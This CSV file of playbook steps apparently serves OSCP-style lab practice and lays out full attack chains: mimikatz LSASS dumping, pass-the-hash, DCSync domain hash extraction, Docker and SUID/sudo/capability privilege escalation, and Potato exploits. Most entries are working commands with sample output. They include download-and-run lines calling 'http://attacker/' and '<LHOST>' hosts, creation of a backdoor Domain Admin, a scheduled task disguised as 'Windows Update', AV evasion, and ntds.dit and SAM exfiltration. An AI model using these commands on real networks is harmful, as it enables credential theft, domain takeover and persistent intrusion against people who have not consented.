"id","name","objective","description","expected_output","notes"
"parse-hashes","Parse and Format Hashes","Extract NTLM hash portion and verify format for pass-the-hash tools","Secretsdump output format: user:rid:lm:ntlm::: - extract 4th field (NTLM hash).
Verify hash is 32 hexadecimal characters.
Discard LM hash (3rd field) as it's rarely needed.","",""
"test-hash-validity","Verify Hash Validity","Test hash against target before full exploitation to confirm it works","Use CrackMapExec with -H flag to test hash authentication.
This quick test (2-3 seconds) prevents wasting time on invalid hashes.","",""
"spray-hash","Spray Hash Across Network","Test hash against multiple targets to identify all accessible systems","Use CrackMapExec to test hash against subnet (CIDR notation).
Local admin password reuse is common - same hash often grants access to multiple systems.","",""
"execute-pth-psexec","Execute Pass-the-Hash with PSExec","Use impacket-psexec with -hashes flag to gain SYSTEM shell on target","Run impacket-psexec with -hashes :NTLM_HASH format.
PSExec provides most stable shell and SYSTEM privileges immediately.","",""
"alternative-pth-wmi","Alternative: Pass-the-Hash with WMIExec","If PSExec fails or detected, use WMIExec as fileless alternative","WMIExec with -hashes provides fileless execution (no binary on disk).
Slightly slower than PSExec but stealthier.","",""
"alternative-pth-evil-winrm","Alternative: Pass-the-Hash with Evil-WinRM","If WinRM available, use Evil-WinRM for interactive PowerShell with hash","Evil-WinRM with -H flag provides richest interactive shell with file upload/download.
Requires WinRM enabled on target.","",""
"harvest-credentials","Harvest Credentials from Compromised System","Extract NTLM hashes from LSASS memory using mimikatz on compromised system with local admin","Use mimikatz to dump all cached credentials from LSASS memory on the compromised system. This step assumes you already have local administrator access on a domain-joined Windows system.

Prerequisites Check:
1. Confirm local admin: whoami /groups (look for BUILTIN\Administrators)
2. Confirm domain-joined: systeminfo | findstr /B /C:""Domain"" (should show domain name, not WORKGROUP)
3. Upload mimikatz.exe to writable directory (C:\temp, C:\Users\Public)

Mimikatz Execution:
1. Enable debug privilege: .\mimikatz.exe ""privilege::debug"" ""exit""
2. Verify output: 'Privilege '20' OK' (mandatory for LSASS access)
3. Dump credentials: .\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > creds.txt
4. Wait 5-10 seconds for dump to complete
5. Review output: type creds.txt | more

Expected Output Structure:
Authentication Id : 0 ; 123456
Session           : Interactive from 2 (or Service from 0, RemoteInteractive from 10)
User Name         : administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 11/24/2025 10:30:15 AM
SID               : S-1-5-21-...
        msv :
         [00000003] Primary
         * Username : administrator
         * Domain   : CORP
         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
         * SHA1     : ...

Key Extraction Points:
- NTLM hash: 32 hexadecimal characters (this is what we need for PTH)
- Username: May be administrator, or other privileged accounts (svc_admin, it_admin, etc.)
- Domain: Confirms domain context (not local account)
- Session type: Service sessions persist longer (preferred targets)

Troubleshooting:
- ERROR 0x00000005: Forgot privilege::debug step, run again with privilege::debug
- No output/empty NTLM: WDigest disabled (Windows 8.1+), target older systems or use Kerberos tickets
- Only computer accounts: No user sessions cached, try different system or wait for user login
- AV quarantines mimikatz: Use obfuscated version, Invoke-Mimikatz (in-memory), or procdump+pypykatz

Alternative Methods:
- pypykatz: lsadump.py (Python alternative, no binary upload)
- procdump + offline parsing: procdump -ma lsass.exe lsass.dmp && pypykatz lsa minidump lsass.dmp
- Invoke-Mimikatz: IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1'); Invoke-Mimikatz","",""
"extract-ntlm-hashes","Extract and Parse NTLM Hashes","Parse mimikatz output to extract NTLM hashes and map to usernames, prioritizing Domain Admin accounts","Parse the mimikatz output to extract NTLM hashes in correct format for Pass-the-Hash tools, and identify which accounts are Domain Admins.

Parsing Process:
1. Open creds.txt (mimikatz output from step 1)
2. Search for 'NTLM     :' lines
3. Extract hash (32 hex characters after 'NTLM     : ')
4. Extract corresponding Username and Domain from same section
5. Build credential list: DOMAIN\username:NTLMhash

Example Parsing:
Input (mimikatz output):
```
* Username : administrator
* Domain   : CORP
* NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

Parsed Output:
CORP\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

Automated Parsing (Linux):
grep -A 5 ""Username"" creds.txt | grep -E ""Username|Domain|NTLM"" > parsed.txt

Prioritization Strategy:
1. Identify Domain Admins: net group ""Domain Admins"" /domain (run on compromised system)
2. Cross-reference extracted usernames with Domain Admins list
3. Priority order:
   - Administrator (built-in Domain Admin, exists in every domain)
   - Domain Admin group members
   - Enterprise Admins (higher privileges, multi-domain)
   - IT/helpdesk accounts (often over-privileged)
   - Service accounts (svc_*, sql_*, backup_*)
4. Start with highest privilege accounts first

Hash Format Validation:
- NTLM hash: EXACTLY 32 hexadecimal characters (0-9, a-f)
- Example valid hash: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
- Invalid formats:
  - 40 characters = SHA1 (wrong type)
  - 16 characters = Half LM hash (incomplete)
  - 64 characters = SHA256 (wrong type)
  - Contains non-hex characters (corrupted)

Common Findings:
- 5-15 cached credentials on typical workstation
- At least 1-2 Domain Admin accounts (if workstation active)
- Computer accounts (HOSTNAME$) - ignore these for PTH
- Local accounts (domain = hostname) - ignore these, focus on DOMAIN\user

Troubleshooting:
- Multiple entries for same user: Use most recent (check Logon Time)
- No Domain Admin accounts: Target more systems, check servers instead of workstations
- Hash extraction fails: Manually copy from mimikatz output, ensure no whitespace
- Unsure if account is DA: Validate with crackmapexec in next step","",""
"validate-pth","Validate Pass-the-Hash Credentials","Test extracted NTLM hashes against Domain Controller to confirm they work and identify Domain Admin access","Use crackmapexec to validate extracted NTLM hashes work for domain authentication and confirm Domain Admin privileges.

Validation Command:
crackmapexec smb <DC_IP> -u <username> -H <NTLM_hash> -d <DOMAIN>

Example:
crackmapexec smb 10.10.10.10 -u administrator -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 -d CORP

Expected Output (Success):
SMB         10.10.10.10     445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP) (signing:True) (SMBv1:False)
SMB         10.10.10.10     445    DC01             [+] CORP\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)

Key Indicators:
- [+] = Authentication successful
- (Pwn3d!) = Domain Admin privileges confirmed (can write to C$ share on DC)
- If no (Pwn3d!): Valid credentials but NOT Domain Admin, test on other systems

Find Domain Controller:
If DC IP unknown:
1. From compromised system: nltest /dclist:CORP
2. Alternative: nslookup -type=SRV _ldap._tcp.dc._msdcs.CORP.LOCAL
3. Alternative: nmap -p 88,389,636 10.10.10.0/24 (look for Kerberos + LDAP)
4. Get DC IP from mimikatz output (Logon Server field)

Test Multiple Credentials:
Create credential list file:
```
administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
it_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1
svc_backup:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2
```

Batch test:
for cred in $(cat creds.txt); do
  user=$(echo $cred | cut -d':' -f1)
  hash=$(echo $cred | cut -d':' -f2)
  crackmapexec smb <DC_IP> -u $user -H $hash -d CORP
done

Validation Criteria:
1. Authentication successful ([+])
2. Pwn3d indicator present (confirms DA)
3. SMB signing status noted (affects some attacks)
4. DC hostname and OS version identified

Troubleshooting:
- Connection timeout: Check network routing, firewall rules, DC online status
- Authentication failed [-]: Hash incorrect, account disabled, or account expired
- [+] but no Pwn3d: Valid user but NOT Domain Admin, can still use for lateral movement
- Account lockout: Test 1 credential at a time, wait between attempts
- SMB signing required: Doesn't affect PTH, but affects relay attacks

What if NO Domain Admin found:
1. Target more systems (servers more likely to have DA sessions)
2. Use Kerberoasting for service accounts
3. Check for Enterprise Admins (higher privileges)
4. Look for Backup Operators (have replication rights like DAs)
5. Proceed with standard user, attempt privilege escalation on DC

Success: At least 1 credential validates with Pwn3d indicator → proceed to DCSync","",""
"dcsync-execution","Execute DCSync to Dump All Domain Credentials","Use validated Domain Admin credentials to perform DCSync attack and extract ALL domain user hashes","Use impacket-secretsdump with Pass-the-Hash to perform DCSync attack, which simulates domain controller replication to extract all domain user NTLM hashes.

DCSync Command:
impacket-secretsdump -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<DC_IP>

Example:
impacket-secretsdump -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 CORP/administrator@10.10.10.10

IMPORTANT SYNTAX:
- Hash format: ':<NTLM>' (colon prefix, no LM hash)
- Domain/user format: 'DOMAIN/username' (forward slash)
- Target: DC IP or hostname
- No spaces around colon in hash parameter

Expected Output:
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x1234567890abcdef1234567890abcdef
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: abcdef1234567890abcdef1234567890
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1:::
CORP.LOCAL\user1:1104:aad3b435b51404eeaad3b435b51404ee:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2:::
[... continues for all domain users ...]

Output Parsing:
Format: username:RID:LM_hash:NTLM_hash:::
- username: Domain user account
- RID: Relative Identifier (500 = Administrator, 502 = krbtgt)
- LM_hash: Legacy hash (usually aad3b435... = empty/disabled)
- NTLM_hash: This is what we need for Pass-the-Hash

Key Targets in Output:
1. Administrator (RID 500): Built-in domain admin, always exists
2. krbtgt (RID 502): Used for Golden Ticket creation (persistence)
3. Domain Admin members: Check 'net group ""Domain Admins"" /domain' output
4. Service accounts: svc_*, sql_*, backup_* (often reused passwords)

Save Output:
impacket-secretsdump -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 CORP/administrator@10.10.10.10 > domain_hashes.txt

Execution Time:
- Small domain (< 100 users): 1-2 minutes
- Medium domain (100-1000 users): 3-5 minutes
- Large domain (> 1000 users): 5-10 minutes

Troubleshooting:
- 'STATUS_ACCESS_DENIED': Credentials not Domain Admin, revalidate in step 3
- Connection timeout: Check network, try alternative DC
- 'RemoteRegistry service failed': May still work, wait for full execution
- Partial output: Network interruption, re-run command
- 'Clock skew too great': Sync attacker time with domain (ntpdate <DC_IP>)

WHY THIS WORKS:
- DCSync uses MS-DRSR protocol (legitimate replication)
- Domain Admins have 'Replicating Directory Changes All' right by default
- DC treats request as legitimate replication from another DC
- Returns NTLM hashes for ALL domain users (even non-DA accounts)
- Stealth: Appears as normal replication in logs (hard to detect without SIEM)

Success: Complete list of domain hashes saved to file, proceed to extract Administrator hash","",""
"extract-administrator-hash","Extract Administrator Hash from DCSync Output","Parse DCSync output to extract Administrator NTLM hash for Domain Controller access","Parse the secretsdump output to extract the Administrator account NTLM hash, which will be used for Pass-the-Hash access to the Domain Controller.

Parsing Process:
1. Open domain_hashes.txt (secretsdump output from step 4)
2. Search for line starting with 'Administrator:500:'
3. Extract NTLM hash (4th field, after third colon)

Example Line:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::

Fields breakdown:
- Administrator: Username
- 500: RID (Relative Identifier, 500 is always built-in Administrator)
- aad3b435b51404eeaad3b435b51404ee: LM hash (empty/disabled, ignore this)
- a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6: NTLM hash (THIS IS WHAT WE NEED)

Extraction Methods:

Manual:
grep ""Administrator:500:"" domain_hashes.txt
Copy 4th field (NTLM hash)

Automated (bash):
grep ""Administrator:500:"" domain_hashes.txt | cut -d':' -f4

Automated (python):
python3 -c ""import sys; line = [l for l in open('domain_hashes.txt') if 'Administrator:500:' in l][0]; print(line.split(':')[3])""

Validation:
- Hash is exactly 32 hexadecimal characters
- Hash is NOT 'aad3b435b51404ee...' (that's the empty LM hash)
- Hash is NOT '31d6cfe0d16ae931b73c59d7e0c089c0' (that's empty password hash)

Additional Hashes to Extract:
1. krbtgt (RID 502): For Golden Ticket creation (persistence)
2. Domain Admin members: For alternative access
3. Service accounts: For additional persistence

Example extraction script:
```bash
#!/bin/bash
echo ""[+] Extracting key hashes from DCSync output""
echo """"
echo ""[*] Administrator hash:""
grep ""Administrator:500:"" domain_hashes.txt | cut -d':' -f4
echo """"
echo ""[*] krbtgt hash (for Golden Ticket):""
grep ""krbtgt:502:"" domain_hashes.txt | cut -d':' -f4
echo """"
echo ""[*] All Domain Admins:""
for user in $(net group ""Domain Admins"" /domain | grep -v ""^The command"" | grep -v ""^Domain Admins"" | grep -v ""^-"" | grep -v ""^$""); do
  grep -i ""^$user:"" domain_hashes.txt | cut -d':' -f1,4
done
```

Save Extracted Hash:
echo ""Administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"" > admin_hash.txt

Troubleshooting:
- Multiple Administrator entries: Use RID 500 (built-in), ignore renamed accounts
- Hash is empty password hash: Account has blank password, still works for PTH
- Can't find Administrator: Try alternative names (admin, administrator.domain)
- File encoding issues: Use 'cat -A' to check for hidden characters

Success: Administrator NTLM hash extracted and validated → proceed to DC access","",""
"pth-to-dc","Pass-the-Hash to Domain Controller","Use extracted Administrator hash to access Domain Controller and retrieve proof of domain compromise","Use Pass-the-Hash with extracted Administrator hash to access the Domain Controller and retrieve flags/proof of compromise.

Access Methods:

1. Evil-WinRM (Preferred for interactive shell):
evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>

Example:
evil-winrm -i 10.10.10.10 -u Administrator -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

2. PSExec (For SYSTEM shell):
impacket-psexec -hashes :<NTLM_HASH> Administrator@<DC_IP>

Example:
impacket-psexec -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 Administrator@10.10.10.10

3. WMIExec (Stealthier, no service creation):
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@<DC_IP>

4. SMBExec (Alternative):
impacket-smbexec -hashes :<NTLM_HASH> Administrator@<DC_IP>

Verification Steps:
1. Confirm successful authentication (prompt appears)
2. Verify user: whoami (should be DOMAIN\Administrator or NT AUTHORITY\SYSTEM)
3. Verify DC: hostname (should match DC hostname)
4. Confirm domain rights: net group ""Domain Admins"" /domain (verify membership)

Flag Retrieval:
1. Navigate to typical flag locations:
   - C:\Users\Administrator\Desktop\proof.txt
   - C:\Users\Administrator\Desktop\flag.txt
   - C:\Users\Administrator\Desktop\root.txt
   - C:\root.txt
2. Read flag: type C:\Users\Administrator\Desktop\proof.txt
3. Document access:
   whoami /all > C:\temp\proof_of_access.txt
   systeminfo >> C:\temp\proof_of_access.txt
   ipconfig /all >> C:\temp\proof_of_access.txt
4. Download proof: download C:\temp\proof_of_access.txt (Evil-WinRM)

Post-Exploitation Actions:

1. Create Persistence:
   - Golden Ticket: Use krbtgt hash from step 5
   - Create backdoor DA: net user backdoor Password123! /add /domain && net group ""Domain Admins"" backdoor /add /domain
   - Schedule task: schtasks /create /tn ""Windows Update"" /tr ""C:\temp\backdoor.exe"" /sc onstart /ru SYSTEM

2. Additional Enumeration:
   - List all DAs: net group ""Domain Admins"" /domain
   - List all computers: net group ""Domain Computers"" /domain
   - List all users: net user /domain
   - Forest information: nltest /domain_trusts

3. Data Exfiltration:
   - AD database: Copy C:\Windows\NTDS\ntds.dit (requires volume shadow copy)
   - SYSVOL: Copy \\<DC>\SYSVOL (Group Policy, scripts)
   - Registry hives: reg save HKLM\SAM C:\temp\sam.hive

4. Lateral Movement:
   - Use Administrator hash for Pass-the-Hash to ALL domain computers
   - Access all C$ shares: dir \\<hostname>\C$
   - Execute commands remotely: wmic /node:<hostname> process call create ""cmd.exe /c whoami""

Troubleshooting:
- Connection refused: Check WinRM/SMB ports (5985, 5986, 445)
- Authentication fails: Verify hash correctness, check account status
- Access denied to flags: Check alternative locations, verify user privileges
- DC unreachable: Check network routing, firewall rules, DC online status

Timeline Documentation:
- Initial foothold: [timestamp]
- Local admin on workstation: [timestamp]
- Credential harvest: [timestamp]
- DCSync execution: [timestamp]
- Domain Admin on DC: [timestamp]
- Total time: X minutes

SUCCESS: You've achieved complete domain compromise using Pass-the-Hash and DCSync, WITHOUT cracking a single password!","",""
"verify-docker-group","Verify Docker Group Membership","Check if current user is in docker group","Run groups and id commands to confirm docker group membership.

User must be in docker group to execute docker commands without sudo.

This is the prerequisite for all Docker escape techniques.","",""
"check-docker-socket","Check Docker Socket Access","Verify access to Docker socket and test if docker commands work","Check permissions on /var/run/docker.sock and test docker ps command.

Socket must be readable/writable by user or docker group.

This confirms docker group membership is effective and daemon is accessible.","",""
"check-available-images","List Available Docker Images","Enumerate available Docker images to use for container escape","Run docker images to see locally cached images.

Prefer using existing images to avoid network traffic/logging.

If no images available, alpine is smallest option (5MB).
Any Linux image works for mount escape.","",""
"mount-host-escape","Execute Docker Mount Escape","Mount host filesystem in container and chroot to gain root access","Run docker with -v /:/mnt to mount entire host filesystem at /mnt inside container.

Then chroot /mnt to change root directory to host filesystem.

This gives full root access to host from inside container.

Use smallest available image (alpine preferred).","",""
"verify-root","Verify Root Access to Host","Confirm full root access to host filesystem and sensitive files","Test access to root-only files:
- /mnt/etc/shadow (password hashes)
- /mnt/root directory
- /mnt/root/.ssh/id_rsa (SSH key)

Success confirms complete host compromise.

Can now read any file, modify any file, plant backdoors.","",""
"quick-wins-check","Quick Wins Check (Sudo Privileges)","Check for instant root via sudo before time-consuming SUID enumeration","OSCP time-saving: Always check sudo first (5 seconds) before SUID enumeration (2+ minutes).

If user has NOPASSWD sudo, instant root without complex exploitation.","",""
"find-suid","Enumerate SUID Binaries","Locate all SUID binaries on system using find command","Search entire filesystem for files with SUID bit set (-perm -4000).

Redirect errors to /dev/null to avoid permission denied noise.","",""
"filter-interesting","Identify Exploitable SUID Binaries","Filter out standard system binaries and focus on exploitable candidates","Exclude common system binaries (passwd, sudo, ping, mount) that are expected to have SUID.

Look for:
- find, vim, nmap
- base64, less, more
- python, perl, awk
- Custom application binaries","",""
"check-gtfobins","Lookup GTFOBins Exploitation Technique","Find exploitation technique for discovered SUID binary on GTFOBins website","Visit https://gtfobins.github.io/ and search for binary name.

Look for 'SUID' section specifically.

Copy exploitation command syntax.","",""
"exploit-suid","Execute SUID Exploitation","Run GTFOBins command to escalate privileges and spawn root shell","Execute exploitation command exactly as documented on GTFOBins.

Common example:
/usr/bin/find . -exec /bin/bash -p \; -quit","",""
"verify-root","Verify Root Access","Confirm effective UID is 0 and full root privileges obtained","Run whoami and id commands to verify root access.

Check if you can read /etc/shadow or /root/ directory.","",""
"check-sudo-privs","Check Sudo Privileges","Identify what commands current user can run with sudo privileges","Run 'sudo -l' to list allowed commands.

Look for:
- NOPASSWD entries (no password required)
- GTFOBins-exploitable binaries
- Dangerous env_keep settings

Parser extracts exploitable configurations automatically.","",""
"analyze-sudoers","Analyze Sudoers Configuration","Identify exploitable sudo configurations from parser output","Review parsed findings for:

1. NOPASSWD entries - no password needed
2. GTFOBins binaries - spawn shells or read files
3. Wildcards - command injection opportunities
4. env_keep=LD_PRELOAD - shared library injection

Parser auto-identifies exploitable binaries from GTFOBins database.","",""
"research-technique","Research GTFOBins Exploitation Technique","Find specific sudo exploitation technique for discovered binary","Visit https://gtfobins.github.io/ and search for the binary name.

Navigate to 'Sudo' section for exploitation commands.
Copy exact syntax including flags.

Common techniques:
1. Shell spawning (find, vim, less)
2. File reading (base64, xxd)
3. Command execution (python, perl, awk)","",""
"exploit-sudo","Execute Sudo Exploitation","Run sudo command with GTFOBins technique to escalate privileges","Execute exploitation command exactly as documented.

Exploitation patterns:
- Shell spawning: sudo <binary> <flags>
- File reading: sudo <binary> /etc/shadow
- Command execution: sudo <binary> -c 'import os; os.system(""/bin/bash"")'

Verify root shell spawned with correct privileges.","",""
"verify-root","Verify Root Access","Confirm effective UID is 0 and full root privileges obtained","Run whoami, id, and attempt to read /etc/shadow to confirm root access.

Verification steps:
- Check both real UID and effective UID
- Verify filesystem access to root-only files
- Test ability to read sensitive files
- Confirm access to /root directory","",""
"enumerate-capabilities","Enumerate File Capabilities","Find all binaries with capabilities set on the system","Use getcap to recursively search the filesystem for binaries with Linux capabilities.

Capabilities grant specific elevated permissions without requiring full SUID root.

This step identifies potential privilege escalation vectors by locating binaries with dangerous capabilities.","",""
"identify-exploitable","Identify Exploitable Capabilities","Filter enumerated capabilities to identify those that enable privilege escalation","Analyze discovered capabilities to identify dangerous ones that enable privilege escalation.

Focus on:
- cap_setuid (spawn root shell)
- cap_dac_override (edit any file)
- cap_dac_read_search (read sensitive files)
- cap_sys_admin (mount filesystems)
- cap_sys_ptrace (inject code into processes)

Cross-reference binaries against GTFOBins database for documented exploitation techniques.","",""
"research-technique","Research Exploitation Technique","Find documented exploitation technique for identified capability and binary combination","Consult GTFOBins capabilities section and HackTricks for specific exploitation techniques.

Each capability/binary combination requires different approach.

Examples:
- Python with cap_setuid uses os.setuid(0)
- vim with cap_dac_override edits /etc/passwd
- tar with cap_dac_read_search reads sensitive files

Document exact command syntax and expected behavior.","",""
"exploit-capability","Execute Capability Exploitation","Use identified capability to perform privileged operations and escalate privileges","Execute documented exploitation technique using the capability-enabled binary.

Exploitation methods by capability:
- cap_setuid: spawn root shell via setuid(0) syscall
- cap_dac_override: edit sensitive files like /etc/passwd to add UID 0 user
- cap_dac_read_search: read shadow file or SSH keys
- cap_sys_ptrace: inject shellcode into root process

Verify privileged operation succeeds.","",""
"verify-access","Verify Elevated Access","Confirm successful privilege escalation to root-level access","Verify escalated privileges by testing root-level operations.

Verification steps:
- Check effective UID with whoami and id commands
- Attempt to read /etc/shadow to confirm read access to sensitive files
- Try accessing /root directory or reading root SSH keys
- If root shell obtained, verify with shell prompt and environment variables

Document exact level of access achieved.","",""
"initial-enumeration","Basic System Enumeration","Gather system information to identify OS version, patch level, current user privileges, and group memberships","Run basic enumeration commands to establish baseline:

1. System Information:
   - OS version and architecture (x86 vs x64)
   - Patch level (missing hotfixes = kernel exploits)
   - Hostname and domain membership

2. User Context:
   - Current username (whoami)
   - User privileges (SeImpersonate, SeDebugPrivilege)
   - Group memberships (Administrators, Backup Operators)

3. Network Context:
   - IP configuration (ipconfig)
   - Network shares (net share)
   - Active connections (netstat)

WHY THIS MATTERS:
- OS version determines exploit compatibility
- User privileges reveal quick-win paths (Potato exploits)
- Group membership shows if UAC bypass needed vs full exploitation
- Architecture (x86/x64) affects payload selection

TIME ESTIMATE: 2-3 minutes","",""
"potato-privilege-check","Check for Potato Exploit Eligibility (QUICK WIN)","Verify if SeImpersonate or SeAssignPrimaryToken privilege is enabled, allowing token impersonation to SYSTEM","CRITICAL QUICK WIN CHECK:

Potato-family exploits are the #1 privilege escalation path for Windows service accounts.

PRIVILEGES TO LOOK FOR:
- SeImpersonatePrivilege (Impersonate a client after authentication)
- SeAssignPrimaryTokenPrivilege (Replace a process level token)

COMMON SCENARIOS WHERE THESE EXIST:
- IIS application pool accounts (IIS APPPOOL\DefaultAppPool)
- SQL Server service accounts (MSSQLSERVER, SQLSERVERAGENT)
- Local Service / Network Service accounts
- Any service running under custom user account

IF ENABLED → SYSTEM shell in 2-5 minutes guaranteed.

EXPLOIT VARIANTS (choose based on Windows version):
- JuicyPotato: Windows 7, 8, Server 2008-2016, Windows 10 < 1809
- RoguePotato: Windows 10 1809+, Server 2019+
- PrintSpoofer: Windows 10, Server 2019+ (simplest, recommended)
- SweetPotato: Universal (works on all versions)

VERIFICATION:
whoami /priv | findstr /i ""SeImpersonate SeAssignPrimaryToken""

Look for 'Enabled' status (not just 'Disabled' presence).","",""
"potato-exploitation","Execute Potato Exploit to SYSTEM","Exploit SeImpersonate privilege to spawn SYSTEM shell using PrintSpoofer, JuicyPotato, or equivalent","EXECUTION WORKFLOW:

1. Transfer exploit binary to target:
   - certutil -urlcache -f http://<LHOST>/PrintSpoofer.exe C:\temp\p.exe
   - OR: PowerShell download: (New-Object Net.WebClient).DownloadFile('http://<LHOST>/PrintSpoofer.exe','C:\temp\p.exe')
   - OR: SMB share: copy \\<LHOST>\share\PrintSpoofer.exe C:\temp\p.exe

2. Execute exploit:
   - PrintSpoofer: C:\temp\PrintSpoofer.exe -i -c cmd
   - JuicyPotato: C:\temp\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
   - SweetPotato: C:\temp\SweetPotato.exe -p cmd.exe -a '/c whoami'

3. Verify SYSTEM shell:
   - whoami (should return 'nt authority\system')
   - whoami /priv (should show ALL privileges enabled)

REVERSE SHELL ALTERNATIVE:
Instead of interactive cmd:
  PrintSpoofer.exe -c ""powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')""

CLSID SELECTION (for JuicyPotato):
- Windows 10 Enterprise: {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
- Windows 10 Pro: {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
- Windows Server 2019: {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}
- Full list: https://github.com/ohpe/juicy-potato/tree/master/CLSID

COMMON ISSUES:
- AV blocks exploit binary → Encode with base64 or use obfuscation
- Port 1337 in use → Change -l flag to different port
- CLSID doesn't work → Try different CLSID from GitHub list","",""
"automated-enumeration","Automated Privilege Escalation Enumeration","Run WinPEAS or PowerUp to comprehensively scan for privilege escalation vectors","AUTOMATED TOOLS FIND MISCONFIGURATIONS FASTER THAN MANUAL ENUMERATION:

1. WinPEAS (Recommended for OSCP):
   - Transfer: certutil -urlcache -f http://<LHOST>/winPEASany.exe C:\temp\w.exe
   - Execute: C:\temp\w.exe
   - Focus on RED/YELLOW findings (critical vulnerabilities)
   - Runtime: 30-60 seconds

2. PowerUp (PowerShell alternative):
   - Execute: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks
   - Fileless execution (no disk write)
   - May be blocked by AMSI (need bypass)
   - Runtime: 20-40 seconds

KEY FINDINGS TO LOOK FOR:
- Unquoted Service Paths (with spaces in path)
- AlwaysInstallElevated (registry keys set to 0x1)
- Modifiable Service Binaries (weak file permissions)
- Modifiable Service Config (SERVICE_CHANGE_CONFIG access)
- AutoLogon Credentials (registry stored passwords)
- Scheduled Tasks (writable scripts/binaries)
- Kernel Exploit Suggestions (missing patches)

OUTPUT INTERPRETATION:
WinPEAS uses color coding:
- RED = Critical (immediate exploitation path)
- YELLOW = High priority (likely exploitable)
- GREEN = Informational (context, not direct exploit)

PowerUp output:
- ServiceName, Description, AbuseFunction provided for each finding
- Use Invoke-ServiceAbuse for automatic exploitation

MANUAL ALTERNATIVE (if tools blocked):
Run individual checks from Step 4-9 manually.","",""
